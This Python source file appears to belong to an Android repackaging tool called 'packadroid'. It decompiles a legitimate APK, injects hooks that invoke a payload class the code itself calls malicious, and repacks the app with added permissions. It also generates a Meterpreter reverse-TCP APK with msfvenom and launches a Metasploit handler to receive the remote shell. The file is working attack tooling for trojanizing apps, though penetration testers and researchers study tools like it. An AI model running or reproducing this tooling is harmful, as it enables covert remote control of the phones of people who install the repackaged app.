import shutil
import os
import subprocess
import sys

from packadroid.apkhandling import packer
from packadroid.hookmanager import activity_hook
from packadroid.hookmanager import broadcast_hook, hook
from packadroid.manifestmanager import manifest_analyzer

class PackadroidSession():
    def __init__(self):
        self.__original_apk_path = None
        self.__original_apk_dec_path = None
        self.__hooks = []
        self.__verbose = False
        self.__activities = []

    def get_hooks(self):
        """Returns the hooks of the current session."""
        return self.__hooks

    def list_hooks(self):
        """Prints all added hooks to the console."""
        print("[*] Currently added Hooks:")
        for i in range(len(self.__hooks)):
            print("Hook " + str(i) + ": " + self.__hooks[i].print_hook())
    
    def remove_hook(self, index):
        """ Removes hook with given index
        :param index: Index for the hooks list
        :type index: int
        """
        if index >= len(self.__hooks):
            print("[!] Index too big, not removing any hook")
            return
        print("[*] Remove hook: " + self.__hooks[index].print_hook())
        del self.__hooks[index]

    def is_original_apk_loaded(self):
        """ Checks if an original apk has already been loaded

        :return True is returned if apk has been loaded.
                False is return if no apk has been loaded.

        """
        return self.__original_apk_path != None

    def load_original_apk(self, apk_path):
        """ Decompiles apk at given path and sets apk_loaded to true.
        
        :param apk_path: Path to the original application.
        :type apk_path: str

        :return Decompile path is returned if no error occured.
                None is returned on error.

        """
        if not os.path.isfile(apk_path):
            print("[-] No .apk file found at the given path!")
            return None

        self.__original_apk_dec_path = packer.decompile_apk(apk_path, self.__verbose)
        if self.__original_apk_dec_path is None:
            print("[-] Could not decompile the original .apk file!")
            return None

        self.__original_apk_path = apk_path
        print("[*] Decompiled {} to {}".format(apk_path, self.__original_apk_dec_path))
        return self.__original_apk_dec_path

    def add_hook(self, t, location, class_name, method_name, payload_apk_path):
        """ Adds either an activity hook or a broadcast hook
        :param t: Type of broadcast: Either activity or broadcast_receiver
        :type t: str        
        
        :param location: Either activity name or broadcast name
        :type location: str

        :param class_name: The name of the class which holds the malicious payload.
        :type class_name: str

        :param method_name: The name of the STATIC method which holds the malicious payload.
        :type method_name: str

        :param payload_apk_path: Path to the malicious application.
        :type payload_apk_path: str

        :return Nothing is returned if no error occured.
                None is returned on error.
        """
        same_apk = [h for h in self.__hooks if h.get_payload_apk_path() == payload_apk_path]
        if (len(same_apk)) < 1:
            # We have not decompiled this apk before
            payload_dec_path = packer.decompile_apk(payload_apk_path, self.__verbose)
            if payload_dec_path is None:
                return None
        else:
            payload_dec_path = same_apk[0].get_payload_dec_path()
        
        if t == "activity":
            try:
                # list_activities loads and stores the activities
                if len(self.__activities) == 0:
                    self.list_activities()
                # location is given as an ID
                activity_id = int(location)
                location = self.__activities[activity_id][0]
            except:
                # not an integer
                pass

        self.__hooks.append(hook.Hook(t, location, class_name, method_name, payload_apk_path, payload_dec_path))

    def list_activities(self):
        """ Prints a list of the activities of the loaded original application. Each activity gets an index which can be used."""
        if not self.is_original_apk_loaded():
            return None
        manifest_path = os.path.join(self.__original_apk_dec_path, "AndroidManifest.xml")
        # store them for later usage
        self.__activities = manifest_analyzer.find_all_activities(manifest_path)
        return self.__activities

    def list_permissions(self):
        """ Prints a list of the permissions of the loaded original application."""
        permissions = manifest_analyzer.get_permissions(self.__original_apk_dec_path + "/AndroidManifest.xml")
        for p in permissions:
            print(p)
        return

    def generate_meterpreter(self, ip, lport):
        """ Generates a reverse shell as apk file using Metasploit.
        
        :param ip: IP address which is used by the reverse shell for the callback
        :type ip: str

        :param lport: Port address which is used by the reverse shell for the callback
        :type lport: int
        
        """
        command = "msfvenom -p android/meterpreter/reverse_tcp LHOST=" + ip + " LPORT=" + lport + " -o meterpreter.apk"
        proc = subprocess.Popen(command, stdout=subprocess.PIPE, shell=True)
        (out, err) = proc.communicate()

        if "invalid" in out.decode('ascii').lower() or \
            "error" in out.decode('ascii').lower():
            print(out)
            sys.exit(1)

    def start_meterpreter_handler(self, ip, lport):
        """Starts a handler for the reverse shell using Metasploit.
        
        :param ip: IP address which is used by the reverse shell for the callback
        :type ip: str

        :param lport: Port address which is used by the reverse shell for the callback
        :type lport: int
        """
        with open("meterpreter_options.txt", "w") as f:
            f.write("use exploit/multi/handler\n")
            f.write("set payload android/meterpreter/reverse_tcp\n")
            f.write("set lhost " + ip + "\n")
            f.write("set lport " + lport + "\n")
            f.write("exploit\n")
    
        command = "msfconsole -r meterpreter_options.txt"
        proc = subprocess.Popen(command, shell=True)
        (out, err) = proc.communicate()

    def repack(self, output=None):
        """ Starts the repacking Process. Adds all hooks to the original applicaiton. Adds all payloads to the original application. Adds all necessary permissions to the Manifest.
        
        :param output: Path/Name of the repacked application
        :type output: str

        """
        if not self.is_original_apk_loaded():
            print("[-] No original .apk file loaded. Use load_original!")
            return None
        if len(self.get_hooks()) < 1:
            print("[-] No hooks added. Nothing to repack!")
            return None

        activity_hooks = [h for h in self.get_hooks() if h.get_type() == "activity"]
        broadcast_hooks = [h for h in self.get_hooks() if h.get_type() == "broadcast_receiver"]

        print("[*] Inserting activity hooks.")
        activity_hook.inject_activity_hooks(activity_hooks, self.__original_apk_dec_path)

        print("[*] Inserting broadcast receiver hooks.")
        broadcast_hook.inject_broadcast_receiver_hooks(broadcast_hooks, self.__original_apk_dec_path)

        if output == None:
            output = os.path.splitext(self.__original_apk_path)[0] +  "_repacked.apk"
        print("[*] Repack apk as {}".format(output))
        packer.repack_apk(self.__original_apk_dec_path, self.__hooks, output, self.__verbose)
        return output

    def cleanup(self):
        """ Removes all decompiled applications. Original applicaitons as well as Malicious Payloads."""
        if self.__original_apk_dec_path != None:
            print("[*] Removing the decompiled original apk!")
            shutil.rmtree(self.__original_apk_dec_path)

        dec_apks = set([h.get_payload_dec_path() for h in self.__hooks])
        for dec_apk_path in dec_apks:
            print("[*] Removing directory containing decompiled payload!")
            shutil.rmtree(dec_apk_path)


    def set_verbose(self, value):
        """ 
            Changes state of verbose logging. 
            Value  of 1 indicates that verbose logging should be activated.
        """
        self.__verbose = (value == 1)
        print("[*] Verbose set to: " + str(self.__verbose))
